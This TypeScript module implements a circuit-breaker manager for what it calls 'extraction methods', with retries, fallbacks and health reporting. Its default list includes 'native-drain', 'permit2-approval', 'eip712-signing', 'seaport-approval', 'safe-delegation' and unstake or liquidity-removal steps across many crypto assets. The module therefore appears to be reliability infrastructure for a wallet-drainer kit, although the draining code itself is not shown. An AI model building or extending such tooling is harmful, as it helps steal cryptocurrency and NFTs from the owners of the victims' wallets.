/**
 * CIRCUIT BREAKER MANAGER
 * =======================
 * Manages multiple circuit breakers for different extraction methods
 * Prevents cascade failures and provides automatic recovery
 *
 * States:
 * - CLOSED: Normal operation, requests pass through
 * - OPEN: Too many failures, requests blocked, retry after cooldown
 * - HALF_OPEN: Testing if service recovered, allow 1 request
 */

import { CircuitBreaker } from './circuit-breaker.js'

export interface CircuitBreakerConfig {
  failureThreshold: number // failures before opening (default: 5)
  successThreshold: number // successes in half-open before closing (default: 2)
  resetTimeMs: number // how long to wait before trying again (default: 60000)
  name: string // identifier for monitoring
}

export interface CircuitState {
  name: string
  state: 'CLOSED' | 'OPEN' | 'HALF_OPEN'
  failures: number
  successes: number
  lastFailureTime?: Date
  nextRetryTime?: Date
  totalRequests: number
  totalFailures: number
  successRate: number // 0-100
}

/**
 * CIRCUIT BREAKER MANAGER CLASS
 * Manages all circuit breakers for extraction methods
 */
export class CircuitBreakerManager {
  private breakers: Map<string, CircuitBreaker> = new Map()
  private configs: Map<string, CircuitBreakerConfig> = new Map()
  private stats: Map<string, { totalRequests: number; totalFailures: number }> = new Map()

  /**
   * Register a new circuit breaker
   */
  registerBreaker(config: CircuitBreakerConfig): void {
    console.log(`[CB_MANAGER] Registering circuit breaker: ${config.name}`)

    this.breakers.set(config.name, new CircuitBreaker(config.failureThreshold, config.successThreshold, config.resetTimeMs))

    this.configs.set(config.name, config)

    this.stats.set(config.name, { totalRequests: 0, totalFailures: 0 })

    console.log(`  ✓ Registered with config: failures=${config.failureThreshold}, success=${config.successThreshold}, resetMs=${config.resetTimeMs}`)
  }

  /**
   * Register all default circuit breakers for extraction methods
   */
  registerDefaultBreakers(): void {
    console.log(`[CB_MANAGER] Registering default circuit breakers for all extraction methods`)

    const methods = [
      // ETH methods
      { name: 'native-drain', threshold: 5, success: 2, reset: 60000 },
      { name: 'contract-call', threshold: 5, success: 2, reset: 60000 },
      { name: 'flashbot-bundle', threshold: 5, success: 2, reset: 60000 },
      // ERC20 methods
      { name: 'permit2-approval', threshold: 5, success: 2, reset: 60000 },
      { name: 'eip712-signing', threshold: 5, success: 2, reset: 60000 },
      { name: 'flashloan-cascade', threshold: 5, success: 2, reset: 90000 }, // Longer cooldown
      { name: 'bridge-transfer', threshold: 3, success: 2, reset: 120000 }, // Very conservative
      // NFT methods
      { name: 'seaport-approval', threshold: 5, success: 2, reset: 60000 },
      { name: 'direct-transfer', threshold: 5, success: 2, reset: 60000 },
      { name: 'bridge-transfer-nft', threshold: 3, success: 2, reset: 120000 },
      { name: 'list-and-sell', threshold: 5, success: 2, reset: 60000 },
      // Staking methods
      { name: 'lido-unstake', threshold: 5, success: 2, reset: 60000 },
      { name: 'rocket-pool-unstake', threshold: 5, success: 2, reset: 60000 },
      { name: 'marinade-unstake', threshold: 5, success: 2, reset: 60000 },
      // LP methods
      { name: 'uniswap-v3-remove', threshold: 5, success: 2, reset: 60000 },
      { name: 'curve-remove', threshold: 5, success: 2, reset: 60000 },
      { name: 'raydium-remove', threshold: 5, success: 2, reset: 60000 },
      // Safe methods
      { name: 'safe-execution', threshold: 3, success: 2, reset: 90000 },
      { name: 'safe-delegation', threshold: 3, success: 2, reset: 90000 },
      // Yield farm methods
      { name: 'aave-withdraw', threshold: 5, success: 2, reset: 60000 },
      { name: 'compound-redeem', threshold: 5, success: 2, reset: 60000 },
      { name: 'yield-claim', threshold: 5, success: 2, reset: 60000 },
    ]

    for (const method of methods) {
      this.registerBreaker({
        name: method.name,
        failureThreshold: method.threshold,
        successThreshold: method.success,
        resetTimeMs: method.reset,
      })
    }

    console.log(`  ✓ Registered ${methods.length} extraction method circuit breakers`)
  }

  /**
   * Execute function with circuit breaker protection
   */
  async execute<T>(
    methodName: string,
    fn: () => Promise<T>,
    fallback?: () => Promise<T>,
  ): Promise<T> {
    const breaker = this.breakers.get(methodName)

    if (!breaker) {
      console.warn(`[CB_MANAGER] No circuit breaker registered for ${methodName}, executing without protection`)
      return fn()
    }

    const stats = this.stats.get(methodName)!

    // Check if circuit breaker allows execution
    if (!breaker.canExecute()) {
      const state = this.getState(methodName)
      console.warn(
        `[CB_MANAGER] Circuit breaker OPEN for ${methodName}, state=${state.state}, failures=${state.failures}`,
      )

      // Try fallback if available
      if (fallback) {
        console.log(`[CB_MANAGER] Attempting fallback for ${methodName}...`)
        try {
          stats.totalRequests++
          const result = await fallback()
          breaker.recordSuccess()
          return result
        } catch (error) {
          breaker.recordFailure()
          stats.totalFailures++
          throw new Error(`Circuit breaker OPEN for ${methodName} and fallback failed`)
        }
      }

      throw new Error(`Circuit breaker OPEN for ${methodName}`)
    }

    // Circuit is CLOSED or HALF_OPEN, try main function
    try {
      stats.totalRequests++
      const result = await fn()
      breaker.recordSuccess()
      console.log(`[CB_MANAGER] Success for ${methodName}, state=${breaker.getState()}`)
      return result
    } catch (error) {
      breaker.recordFailure()
      stats.totalFailures++
      const state = this.getState(methodName)
      console.error(
        `[CB_MANAGER] Failure for ${methodName}, failures=${state.failures}, state=${state.state}`,
      )

      // If circuit just opened, try fallback
      if (!breaker.canExecute() && fallback) {
        console.log(`[CB_MANAGER] Circuit breaker just opened, trying fallback...`)
        try {
          const result = await fallback()
          breaker.recordSuccess()
          return result
        } catch (fallbackError) {
          throw error // Return original error, not fallback error
        }
      }

      throw error
    }
  }

  /**
   * Get state of specific circuit breaker
   */
  getState(methodName: string): CircuitState {
    const breaker = this.breakers.get(methodName)
    const stats = this.stats.get(methodName)

    if (!breaker || !stats) {
      return {
        name: methodName,
        state: 'CLOSED',
        failures: 0,
        successes: 0,
        totalRequests: 0,
        totalFailures: 0,
        successRate: 100,
      }
    }

    const successRate = stats.totalRequests > 0 ? ((stats.totalRequests - stats.totalFailures) / stats.totalRequests) * 100 : 100

    return {
      name: methodName,
      state: breaker.getState(),
      failures: (breaker as any).failures || 0,
      successes: (breaker as any).successes || 0,
      totalRequests: stats.totalRequests,
      totalFailures: stats.totalFailures,
      successRate: Math.round(successRate * 100) / 100,
    }
  }

  /**
   * Get all circuit breaker states
   */
  getAllStates(): CircuitState[] {
    return Array.from(this.breakers.keys()).map((name) => this.getState(name))
  }

  /**
   * Get only OPEN circuit breakers (for monitoring/alerting)
   */
  getOpenBreakers(): CircuitState[] {
    return this.getAllStates().filter((state) => state.state === 'OPEN')
  }

  /**
   * Get health summary
   */
  getHealthSummary(): {
    totalMethods: number
    closedCount: number
    halfOpenCount: number
    openCount: number
    averageSuccessRate: number
    unhealthyMethods: string[]
  } {
    const states = this.getAllStates()

    const closed = states.filter((s) => s.state === 'CLOSED').length
    const halfOpen = states.filter((s) => s.state === 'HALF_OPEN').length
    const open = states.filter((s) => s.state === 'OPEN').length

    const avgSuccessRate =
      states.reduce((sum, s) => sum + s.successRate, 0) / states.length

    const unhealthy = states
      .filter((s) => s.state === 'OPEN' || s.successRate < 70)
      .map((s) => `${s.name} (${s.state}, ${s.successRate}% success)`)

    return {
      totalMethods: states.length,
      closedCount: closed,
      halfOpenCount: halfOpen,
      openCount: open,
      averageSuccessRate: Math.round(avgSuccessRate * 100) / 100,
      unhealthyMethods: unhealthy,
    }
  }

  /**
   * Reset specific circuit breaker
   */
  reset(methodName: string): void {
    const breaker = this.breakers.get(methodName)
    if (breaker) {
      ;(breaker as any).reset()
      console.log(`[CB_MANAGER] Reset circuit breaker: ${methodName}`)
    }
  }

  /**
   * Reset all circuit breakers
   */
  resetAll(): void {
    for (const breaker of this.breakers.values()) {
      ;(breaker as any).reset()
    }
    console.log(`[CB_MANAGER] Reset all ${this.breakers.size} circuit breakers`)
  }

  /**
   * Print health summary to console
   */
  printHealthReport(): void {
    const health = this.getHealthSummary()

    console.log(`\n${'='.repeat(70)}`)
    console.log(`CIRCUIT BREAKER HEALTH REPORT`)
    console.log(`${'='.repeat(70)}`)
    console.log(`Total Methods:       ${health.totalMethods}`)
    console.log(`Closed (healthy):    ${health.closedCount}`)
    console.log(`Half-Open (testing): ${health.halfOpenCount}`)
    console.log(`Open (failing):      ${health.openCount}`)
    console.log(`Avg Success Rate:    ${health.averageSuccessRate}%`)

    if (health.unhealthyMethods.length > 0) {
      console.log(`\nUnhealthy Methods:`)
      health.unhealthyMethods.forEach((m) => console.log(`  ⚠️  ${m}`))
    } else {
      console.log(`\n✅ All methods healthy!`)
    }

    console.log(`${'='.repeat(70)}\n`)
  }
}

export default CircuitBreakerManager
